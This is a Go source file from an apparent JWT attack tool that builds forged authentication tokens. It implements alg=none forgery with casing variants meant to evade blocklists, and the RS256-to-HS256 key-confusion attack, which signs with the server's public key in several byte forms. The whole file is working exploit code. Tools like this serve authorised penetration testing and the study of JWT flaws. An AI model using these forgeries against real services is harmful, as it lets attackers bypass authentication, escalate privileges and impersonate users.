// Package attack builds exploit tokens from a base JWT: the alg=none family,
// the RS256->HS256 key-confusion attack, embedded-jwk / jku / kid injection,
// and arbitrary claim edits.
package attack

import (
	"crypto/ecdsa"
	"crypto/rsa"
	"fmt"
	"strings"

	"github.com/MRvirusIR/clavis/internal/jwt"
)

// edited returns header/claims copies with kv edits applied to the claims,
// and optional header edits. Claim keys set to "DELETE" are removed.
func edited(base *jwt.Token, claimKV, headerKV map[string]any) (map[string]any, map[string]any) {
	h := jwt.CloneMap(base.Header)
	c := jwt.CloneMap(base.Claims)
	if c == nil {
		c = map[string]any{}
	}
	for k, v := range claimKV {
		if s, ok := v.(string); ok && s == "DELETE" {
			delete(c, k)
			continue
		}
		c[k] = v
	}
	for k, v := range headerKV {
		h[k] = v
	}
	return h, c
}

// AlgNone forges a token with alg=none. variant controls the header casing
// used to bypass naive blocklists: "none","None","NONE","nOnE".
func AlgNone(base *jwt.Token, claimKV map[string]any, variant string) (string, error) {
	if variant == "" {
		variant = "none"
	}
	h, c := edited(base, claimKV, map[string]any{"alg": variant})
	hp := jwt.EncodeHeader(h)
	cp := jwt.EncodeClaims(c)
	return hp + "." + cp + ".", nil
}

// AlgNoneVariants returns the common casing permutations testers spray.
func AlgNoneVariants(base *jwt.Token, claimKV map[string]any) map[string]string {
	out := map[string]string{}
	for _, v := range []string{"none", "None", "NONE", "nOnE"} {
		tok, err := AlgNone(base, claimKV, v)
		if err == nil {
			out[v] = tok
		}
	}
	return out
}

// Confuse implements the RS256->HS256 confusion attack: it re-signs the token
// with HS256 using the RSA/EC *public key* bytes as the HMAC secret. Servers
// that accept an attacker-chosen alg will verify it with the same public key.
func Confuse(base *jwt.Token, pubPEM []byte, claimKV map[string]any, hsAlg string) (string, error) {
	if hsAlg == "" {
		hsAlg = "HS256"
	}
	if !strings.HasPrefix(hsAlg, "HS") {
		return "", fmt.Errorf("confuse target must be HS*, got %q", hsAlg)
	}
	h, c := edited(base, claimKV, map[string]any{"alg": hsAlg})
	si := jwt.EncodeHeader(h) + "." + jwt.EncodeClaims(c)
	sig, err := jwt.SignHMAC(hsAlg, si, pubPEM)
	if err != nil {
		return "", err
	}
	return si + "." + sig, nil
}

// ConfuseVariants signs with several byte-exact forms of the public key,
// because servers differ in whether they include a trailing newline etc.
func ConfuseVariants(base *jwt.Token, pubPEM []byte, claimKV map[string]any, hsAlg string) map[string]string {
	if hsAlg == "" {
		hsAlg = "HS256"
	}
	out := map[string]string{}
	forms := map[string][]byte{
		"pem-as-is":       pubPEM,
		"pem-trimmed":     []byte(strings.TrimSpace(string(pubPEM))),
		"pem-trailing-nl": []byte(strings.TrimSpace(string(pubPEM)) + "\n"),
		"pem-crlf":        []byte(strings.ReplaceAll(strings.TrimSpace(string(pubPEM)), "\n", "\r\n") + "\r\n"),
	}
	for name, key := range forms {
		h, c := edited(base, claimKV, map[string]any{"alg": hsAlg})
		si := jwt.EncodeHeader(h) + "." + jwt.EncodeClaims(c)
		if sig, err := jwt.SignHMAC(hsAlg, si, key); err == nil {
			out[name] = si + "." + sig
		}
	}
	return out
}

// NormalizePublic re-encodes whatever public key we parsed back to canonical
// PKIX PEM, so the confusion secret matches what most servers store.
func NormalizePublic(pubPEM []byte) ([]byte, error) {
	if k, err := jwt.ParseRSAPublic(pubPEM); err == nil {
		return jwt.PublicToPEM((*rsa.PublicKey)(k))
	}
	if k, err := jwt.ParseECPublic(pubPEM); err == nil {
		return jwt.PublicToPEM((*ecdsa.PublicKey)(k))
	}
	return pubPEM, nil
}
